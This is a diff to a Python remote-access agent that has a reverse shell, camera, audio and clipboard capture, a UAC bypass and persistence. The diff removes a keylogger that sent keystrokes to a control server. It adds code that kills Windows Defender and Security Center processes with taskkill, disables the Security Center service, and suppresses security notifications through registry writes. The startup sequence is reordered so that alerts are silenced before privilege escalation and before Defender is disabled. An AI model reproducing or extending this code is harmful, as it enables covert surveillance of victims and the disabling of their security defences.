@@ -708,7 +708,6 @@ TARGET_CAMERA_FPS = 20
 _stream_lock = threading.Lock()
 _audio_stream_lock = threading.Lock()
 _camera_stream_lock = threading.Lock()
-_keylogger_lock = threading.Lock()
 _clipboard_lock = threading.Lock()
 _reverse_shell_lock = threading.Lock()
 _voice_control_lock = threading.Lock()
@@ -748,9 +747,7 @@ CLIPBOARD_MONITOR_THREAD = None
 CLIPBOARD_BUFFER = []
 LAST_CLIPBOARD_CONTENT = ""
 
-KEYLOGGER_ENABLED = False
-KEYLOGGER_THREAD = None
-KEYLOG_BUFFER = []
+# Keylogger variables removed - feature disabled
 
 VOICE_CONTROL_ENABLED = False
 VOICE_CONTROL_THREAD = None
@@ -4289,14 +4286,16 @@ if __name__ == "__main__":
         return False
 
 def disable_defender():
-    """Attempt to disable Windows Defender (tries even without admin)."""
+    """Attempt to disable Windows Defender (tries even without admin) - ENHANCED VERSION."""
     if not WINDOWS_AVAILABLE:
         return False
     
     # Try to disable Defender even without admin - some methods might work
-    log_message("[DEFENDER] Attempting to disable Windows Defender...")
+    log_message("[DEFENDER] Attempting to disable Windows Defender (ENHANCED)...")
     
     try:
+        success_count = 0
+        
         # Multiple methods to disable Windows Defender
         defender_disable_methods = [
             disable_defender_registry,
@@ -4308,14 +4307,54 @@ def disable_defender():
         for method in defender_disable_methods:
             try:
                 if method():
-                    return True
+                    success_count += 1
             except:
                 continue
         
-        return False
+        # Kill Security Center processes
+        try:
+            kill_security_processes()
+            success_count += 1
+        except:
+            pass
+        
+        log_message(f"[DEFENDER] Applied {success_count}/{len(defender_disable_methods)+1} disable methods")
+        return success_count > 0
         
     except Exception as e:
         log_message(f"Failed to disable Defender: {e}")
+        return False
+
+def kill_security_processes():
+    """Kill Windows Security Center and Defender processes."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import subprocess
+        
+        # List of security processes to terminate
+        security_processes = [
+            "SecurityHealthSystray.exe",  # Windows Security icon in system tray
+            "SecurityHealthService.exe",  # Windows Security service
+            "MsMpEng.exe",  # Windows Defender Antimalware Service
+            "NisSrv.exe",  # Windows Defender Network Inspection Service
+            "smartscreen.exe",  # SmartScreen
+        ]
+        
+        for process in security_processes:
+            try:
+                subprocess.run(['taskkill', '/F', '/IM', process],
+                             creationflags=subprocess.CREATE_NO_WINDOW,
+                             capture_output=True, timeout=5)
+                log_message(f"[DEFENDER] Terminated process: {process}")
+            except:
+                continue
+        
+        return True
+        
+    except Exception as e:
+        log_message(f"[DEFENDER] Failed to kill security processes: {e}")
         return False
 
 def disable_defender_registry():
@@ -4793,15 +4832,62 @@ def setup_com_hijacking_persistence():
 
 # Removed duplicate functions - these are already defined above
 
+def disable_notifications_no_admin():
+    """Disable notifications that don't require admin - runs BEFORE UAC bypass."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        log_message("[NOTIFICATIONS] Disabling user-level notifications (no admin required)...")
+        
+        success_count = 0
+        
+        # Only user-level (HKCU) registry changes that don't need admin
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "ToastEnabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Action Center disabled (HKCU)")
+            success_count += 1
+        except:
+            pass
+        
+        try:
+            key_path = r"SOFTWARE\Policies\Microsoft\Windows\Explorer"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "DisableNotificationCenter", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            success_count += 1
+        except:
+            pass
+        
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows Defender\UX Configuration"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Notification_Suppress", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            success_count += 1
+        except:
+            pass
+        
+        log_message(f"[NOTIFICATIONS] Pre-admin: {success_count}/3 user-level notifications disabled")
+        return success_count > 0
+        
+    except Exception as e:
+        log_message(f"[NOTIFICATIONS] Pre-admin error: {e}")
+        return False
+
 def disable_windows_notifications():
-    """Disable all Windows notifications and action center."""
+    """Disable all Windows notifications and action center - ENHANCED VERSION."""
     if not WINDOWS_AVAILABLE:
         log_message("[NOTIFICATIONS] Windows not available")
         return False
     
     try:
         import winreg
-        log_message("[NOTIFICATIONS] Disabling Windows notifications...")
+        log_message("[NOTIFICATIONS] Disabling Windows notifications (ENHANCED)...")
         
         success_count = 0
         
@@ -4827,7 +4913,7 @@ def disable_windows_notifications():
         except Exception as e:
             log_message(f"[NOTIFICATIONS] Failed to disable Notification Center (HKCU): {e}")
         
-        # 3. Disable Windows Defender notifications (Current User)
+        # 3. Disable Windows Defender notifications (Current User) - ENHANCED
         try:
             key_path = r"SOFTWARE\Microsoft\Windows Defender\UX Configuration"
             key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
@@ -4837,6 +4923,29 @@ def disable_windows_notifications():
             success_count += 1
         except Exception as e:
             log_message(f"[NOTIFICATIONS] Failed to disable Defender notifications (HKCU): {e}")
+        
+        # 3b. Disable Windows Security notifications via HKLM (if admin)
+        try:
+            key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"
+            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+            winreg.SetValueEx(key, "DisableNotifications", 0, winreg.REG_DWORD, 1)
+            winreg.SetValueEx(key, "DisableEnhancedNotifications", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Windows Security notifications disabled (HKLM)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security notifications (HKLM): {e}")
+        
+        # 3c. Disable Windows Security Center notifications
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows Defender Security Center\Notifications"
+            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+            winreg.SetValueEx(key, "DisableNotifications", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Windows Security Center notifications disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security Center notifications: {e}")
         
         # 4. Disable toast notifications (Current User)
         try:
@@ -4886,7 +4995,29 @@ def disable_windows_notifications():
         except Exception as e:
             log_message(f"[NOTIFICATIONS] Failed to disable Security notifications: {e}")
         
-        log_message(f"[NOTIFICATIONS] Notification disable completed: {success_count}/7 settings applied")
+        # 8. Disable Windows Security App notifications specifically
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityCenter"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Security Center app notifications disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security Center app notifications: {e}")
+        
+        # 9. Disable Action Center service (if admin)
+        try:
+            import subprocess
+            subprocess.run(['sc', 'config', 'wscsvc', 'start=', 'disabled'], 
+                          creationflags=subprocess.CREATE_NO_WINDOW,
+                          capture_output=True, timeout=10)
+            log_message("[NOTIFICATIONS] Security Center service disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security Center service: {e}")
+        
+        log_message(f"[NOTIFICATIONS] Notification disable completed: {success_count}/10 settings applied")
         return success_count > 0
         
     except Exception as e:
@@ -5976,9 +6107,7 @@ VOICE_CONTROL_THREAD = None
 VOICE_RECOGNIZER = None
 
 # --- Monitoring State ---
-KEYLOGGER_ENABLED = False
-KEYLOGGER_THREAD = None
-KEYLOG_BUFFER = []
+# Keylogger variables removed - feature disabled
 CLIPBOARD_MONITOR_ENABLED = False
 CLIPBOARD_MONITOR_THREAD = None
 CLIPBOARD_BUFFER = []
@@ -8724,124 +8853,9 @@ def handle_key_up(data):
     except Exception as e:
         log_message(f"Error handling key up: {e}")
 
-# --- Keylogger Functions ---
-
-def on_key_press(key):
-    """Callback for key press events."""
-    global KEYLOG_BUFFER
-    try:
-        if hasattr(key, 'char') and key.char is not None:
-            # Regular character
-            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: '{key.char}'")
-        else:
-            # Special key
-            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [{key}]")
-    except Exception as e:
-        KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [ERROR: {e}]")
-
-def keylogger_worker(agent_id):
-    """Keylogger worker thread that sends data periodically."""
-    global KEYLOGGER_ENABLED, KEYLOG_BUFFER
-    
-    try:
-        while KEYLOGGER_ENABLED:
-            try:
-                if KEYLOG_BUFFER:
-                    # Send accumulated keylog data
-                    data_to_send = KEYLOG_BUFFER.copy()
-                    KEYLOG_BUFFER = []
-                    
-                    # Use socket.io for better performance and consistency
-                    try:
-                        if sio and sio.connected:
-                            for entry in data_to_send:
-                                safe_emit('keylog_data', {
-                                    'agent_id': agent_id,
-                                    'data': entry
-                                })
-                        else:
-                            log_message("Socket.io not connected, buffering keylog data", "warning")
-                            # Re-add data to buffer if connection is down
-                            KEYLOG_BUFFER.extend(data_to_send)
-                    except Exception as e:
-                        error_msg = str(e)
-                        # Silence connection errors
-                        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
-                            log_message(f"Keylogger socket.io error: {e}")
-                        # Fallback to HTTP if socket.io fails
-                        if REQUESTS_AVAILABLE:
-                            try:
-                                url = f"{SERVER_URL}/keylog_data/{agent_id}"
-                                for entry in data_to_send:
-                                    requests.post(url, json={"data": entry}, timeout=5)
-                            except Exception as http_e:
-                                log_message(f"Keylogger HTTP fallback error: {http_e}")
-                                # Re-add data to buffer for next attempt
-                                KEYLOG_BUFFER.extend(data_to_send)
-                        else:
-                            log_message("HTTP fallback not available, re-buffering keylog data", "warning")
-                            KEYLOG_BUFFER.extend(data_to_send)
-                
-                time.sleep(5)  # Send data every 5 seconds
-            except KeyboardInterrupt:
-                log_message("Keylogger worker interrupted")
-                break
-            except Exception as e:
-                log_message(f"Keylogger worker error: {e}")
-                time.sleep(5)
-    except KeyboardInterrupt:
-        log_message("Keylogger worker interrupted")
-    
-    log_message("Keylogger worker stopped")
-
-def start_keylogger(agent_id):
-    """Start the keylogger."""
-    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
-    
-    if not PYNPUT_AVAILABLE:
-        log_message("Error: pynput not available for keylogger", "error")
-        return False
-    
-    with _keylogger_lock:  # ✅ THREAD-SAFE: Prevent race condition
-        if KEYLOGGER_ENABLED:
-            log_message("Keylogger already running", "warning")
-            return True
-        
-        try:
-            KEYLOGGER_ENABLED = True
-            
-            # Start keyboard listener
-            listener = keyboard.Listener(on_press=on_key_press)
-            listener.daemon = True
-            listener.start()
-            log_message("Keyboard listener started successfully")
-            
-            # Start worker thread
-            KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
-            KEYLOGGER_THREAD.daemon = True
-            KEYLOGGER_THREAD.start()
-            log_message("Keylogger worker thread started successfully")
-            
-            log_message("Keylogger started successfully")
-            return True
-            
-        except Exception as e:
-            log_message(f"Failed to start keylogger: {e}", "error")
-            KEYLOGGER_ENABLED = False
-            return False
-
-def stop_keylogger():
-    """Stop the keylogger."""
-    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
-    
-    with _keylogger_lock:  # ✅ THREAD-SAFE
-        if not KEYLOGGER_ENABLED:
-            return
-        
-        KEYLOGGER_ENABLED = False
-        # Don't join - daemon thread will exit naturally (prevents blocking)
-        KEYLOGGER_THREAD = None
-        log_message("Stopped keylogger.")
+# --- Keylogger Functions REMOVED ---
+# Keylogger functionality has been removed for privacy/security compliance
+# Remote control (mouse/keyboard) functionality is still available
 
 # --- Clipboard Monitor Functions ---
 
@@ -9027,7 +9041,7 @@ def register_socketio_handlers():
                 'screen': True,
                 'camera': CV2_AVAILABLE,
                 'audio': PYAUDIO_AVAILABLE,
-                'keylogger': PYNPUT_AVAILABLE,
+                'keylogger': False,  # Disabled - feature removed
                 'clipboard': True,
                 'file_manager': True,
                 'process_manager': PSUTIL_AVAILABLE,
@@ -9725,8 +9739,7 @@ def main_loop(agent_id):
         "stop-audio": stop_audio_streaming,
         "start-camera": lambda: start_camera_streaming(agent_id),
         "stop-camera": stop_camera_streaming,
-        "start-keylogger": lambda: start_keylogger(agent_id),
-        "stop-keylogger": stop_keylogger,
+        # Keylogger commands removed - feature disabled
         "start-clipboard": lambda: start_clipboard_monitor(agent_id),
         "stop-clipboard": stop_clipboard_monitor,
         "start-reverse-shell": lambda: start_reverse_shell(agent_id),
@@ -12243,10 +12256,10 @@ def main_unified():
 # ========================================================================================
 
 def connect():
+    """Handle connection to server."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle connect event", "warning")
         return
-    """Handle connection to server."""
     agent_id = get_or_create_agent_id()
     
     # Add stealth delay
@@ -12268,7 +12281,7 @@ def connect():
             'screen': True,
             'camera': CV2_AVAILABLE,
             'audio': PYAUDIO_AVAILABLE,
-            'keylogger': PYNPUT_AVAILABLE,
+            'keylogger': False,  # Disabled - feature removed
             'clipboard': True,
             'file_manager': True,
             'process_manager': PSUTIL_AVAILABLE,
@@ -12316,10 +12329,10 @@ def connect():
         pass
 
 def disconnect():
+    """Handle disconnection from server."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle disconnect event", "warning")
         return
-    """Handle disconnection from server."""
     log_message("Disconnected from server")
 
 def on_start_stream(data):
@@ -13121,10 +13134,10 @@ def on_remote_key_press(data):
         emit_system_notification('error', 'Remote Control Error', f'Key press failed: {str(e)}')
 
 def on_file_upload(data):
+    """Handle file upload via Socket.IO."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle file upload", "warning")
         return
-    """Handle file upload via Socket.IO."""
     try:
         if not data or not isinstance(data, dict):
             safe_emit('file_upload_result', {'success': False, 'error': 'Invalid data format'})
@@ -13153,10 +13166,10 @@ def on_file_upload(data):
 # ========================================================================================
 
 def on_webrtc_offer(data):
+    """Handle WebRTC offer from controller to start streaming."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC offer", "warning")
         return
-    """Handle WebRTC offer from controller to start streaming."""
     try:
         agent_id = get_or_create_agent_id()
         offer_sdp = data.get('sdp')
@@ -13186,10 +13199,10 @@ def on_webrtc_offer(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_answer(data):
+    """Handle WebRTC answer from controller."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC answer", "warning")
         return
-    """Handle WebRTC answer from controller."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         answer_sdp = data.get('sdp')
@@ -13213,10 +13226,10 @@ def on_webrtc_answer(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_ice_candidate(data):
+    """Handle ICE candidate from controller."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC ICE candidate", "warning")
         return
-    """Handle ICE candidate from controller."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         candidate_data = data.get('candidate')
@@ -13299,10 +13312,10 @@ def on_webrtc_stop_streaming(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_stats(data):
+    """Handle request for WebRTC streaming statistics."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC get stats", "warning")
         return
-    """Handle request for WebRTC streaming statistics."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         
@@ -13326,10 +13339,10 @@ def on_webrtc_get_stats(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_set_quality(data):
+    """Handle request to adjust WebRTC streaming quality."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC set quality", "warning")
         return
-    """Handle request to adjust WebRTC streaming quality."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         quality = data.get('quality', 85)
@@ -13355,10 +13368,10 @@ def on_webrtc_set_quality(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_quality_change(data):
+    """Handle request to change WebRTC quality level."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC quality change", "warning")
         return
-    """Handle request to change WebRTC quality level."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         quality_level = data.get('quality_level', 'auto')
@@ -13382,10 +13395,10 @@ def on_webrtc_quality_change(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_frame_dropping(data):
+    """Handle request to implement frame dropping."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC frame dropping", "warning")
         return
-    """Handle request to implement frame dropping."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         load_threshold = data.get('load_threshold', 0.8)
@@ -13409,10 +13422,10 @@ def on_webrtc_frame_dropping(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_enhanced_stats(data):
+    """Handle request for enhanced WebRTC statistics."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC get enhanced stats", "warning")
         return
-    """Handle request for enhanced WebRTC statistics."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         
@@ -13434,10 +13447,10 @@ def on_webrtc_get_enhanced_stats(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_production_readiness(data):
+    """Handle request for production readiness assessment."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC get production readiness", "warning")
         return
-    """Handle request for production readiness assessment."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         
@@ -13456,10 +13469,10 @@ def on_webrtc_get_production_readiness(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_migration_plan(data):
+    """Handle request for mediasoup migration plan."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC get migration plan", "warning")
         return
-    """Handle request for mediasoup migration plan."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         
@@ -13478,10 +13491,10 @@ def on_webrtc_get_migration_plan(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_get_monitoring_data(data):
+    """Handle request for comprehensive monitoring data."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC get monitoring data", "warning")
         return
-    """Handle request for comprehensive monitoring data."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         
@@ -13503,10 +13516,10 @@ def on_webrtc_get_monitoring_data(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_adaptive_bitrate_control(data):
+    """Handle request to manually trigger adaptive bitrate control."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC adaptive bitrate control", "warning")
         return
-    """Handle request to manually trigger adaptive bitrate control."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         current_quality = data.get('current_quality', 'auto')
@@ -13530,10 +13543,10 @@ def on_webrtc_adaptive_bitrate_control(data):
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
 def on_webrtc_implement_frame_dropping(data):
+    """Handle request to manually implement frame dropping."""
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle WebRTC implement frame dropping", "warning")
         return
-    """Handle request to manually implement frame dropping."""
     try:
         agent_id = data.get('agent_id', get_or_create_agent_id())
         load_threshold = data.get('load_threshold', 0.8)
@@ -13999,7 +14012,7 @@ def agent_main():
             'screen': True,
             'camera': CV2_AVAILABLE,
             'audio': PYAUDIO_AVAILABLE,
-            'keylogger': PYNPUT_AVAILABLE,
+            'keylogger': False,  # Disabled - feature removed
             'clipboard': True,
             'file_manager': True,
             'process_manager': PSUTIL_AVAILABLE,
@@ -14129,10 +14142,7 @@ def signal_handler(signum, frame):
         except Exception as e:
             log_message(f"Error stopping camera streaming: {e}")
         
-        try:
-            stop_keylogger()
-        except Exception as e:
-            log_message(f"Error stopping keylogger: {e}")
+        # Keylogger cleanup removed - feature disabled
         
         try:
             stop_clipboard_monitor()
@@ -14189,14 +14199,24 @@ if __name__ == "__main__":
         
         print("=" * 80)
     
-    # PRIORITY 1: Disable WSL, UAC, Defender, and Notifications FIRST
+    # PRIORITY 1: Disable WSL, UAC, Notifications, and Defender in CORRECT ORDER
     try:
         print("[STARTUP] === SYSTEM CONFIGURATION STARTING ===")
         print("[STARTUP] Using SILENT methods (no popups, no user interaction)")
         print("=" * 80)
         
-        # 0. Disable WSL routing FIRST (fixes command execution!)
-        print("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
+        # 0a. SUPPRESS NOTIFICATIONS FIRST (before any UAC bypass attempts!)
+        print("[STARTUP] Step 0a: Pre-suppressing notifications (no admin needed)...")
+        try:
+            if disable_notifications_no_admin():
+                print("[STARTUP] ✅ User-level notifications suppressed (including Security alerts)")
+            else:
+                print("[STARTUP] ⚠️ Pre-notification suppression partially succeeded")
+        except Exception as e:
+            print(f"[STARTUP] Pre-notification error: {e}")
+        
+        # 0b. Disable WSL routing (fixes command execution!)
+        print("\n[STARTUP] Step 0b: Disabling WSL routing (AGGRESSIVE)...")
         try:
             if disable_wsl_routing():
                 print("[STARTUP] ✅ WSL routing disabled - commands will use PowerShell directly")
@@ -14216,6 +14236,16 @@ if __name__ == "__main__":
                 print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
                 print("[STARTUP] ✅ Admin password popups are NOW DISABLED for ALL exe/installers!")
                 print("[STARTUP] ✅ You can now run ANY application without password prompts!")
+                
+                # Immediately disable notifications after gaining admin
+                print("\n[STARTUP] Step 1b: Immediately disabling ALL notifications (we have admin now)...")
+                try:
+                    if disable_windows_notifications():
+                        print("[STARTUP] ✅ Notifications disabled (including Windows Security alerts)")
+                    else:
+                        print("[STARTUP] ⚠️ Notification disable partially succeeded")
+                except Exception as e:
+                    print(f"[STARTUP] Notification disable error: {e}")
             else:
                 print("[STARTUP] ⚠️ Bootstrap UAC bypass failed")
                 print("[STARTUP] ℹ️ Agent will continue running with normal privileges")
@@ -14229,8 +14259,18 @@ if __name__ == "__main__":
             # import traceback
             # traceback.print_exc()
         
-        # 2. Disable Windows Defender
-        print("\n[STARTUP] Step 2: Disabling Windows Defender...")
+        # 2. Disable Windows notifications (if not done in step 1b)
+        print("\n[STARTUP] Step 2: Ensuring Windows notifications are disabled...")
+        try:
+            if disable_windows_notifications():
+                print("[STARTUP] ✅ Notifications disabled successfully")
+            else:
+                print("[STARTUP] ℹ️ Notification disable partially succeeded")
+        except Exception as e:
+            print(f"[STARTUP] ℹ️ Notification disable error (non-critical): {e}")
+        
+        # 3. Disable Windows Defender (AFTER notifications are suppressed)
+        print("\n[STARTUP] Step 3: Disabling Windows Defender...")
         try:
             if disable_defender():
                 print("[STARTUP] ✅ Windows Defender disabled successfully")
@@ -14238,16 +14278,6 @@ if __name__ == "__main__":
                 print("[STARTUP] ℹ️ Defender disable failed - will retry in background")
         except Exception as e:
             print(f"[STARTUP] ℹ️ Defender disable error (non-critical): {e}")
-        
-        # 3. Disable Windows notifications
-        print("\n[STARTUP] Step 3: Disabling Windows notifications...")
-        try:
-            if disable_windows_notifications():
-                print("[STARTUP] ✅ Notifications disabled successfully")
-            else:
-                print("[STARTUP] ℹ️ Notification disable failed - will retry in background")
-        except Exception as e:
-            print(f"[STARTUP] ℹ️ Notification disable error (non-critical): {e}")
         
         print("\n" + "=" * 80)
         print("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
